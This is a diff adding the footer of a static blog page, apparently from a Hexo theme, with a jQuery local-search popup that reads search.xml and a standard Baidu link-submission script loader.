+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
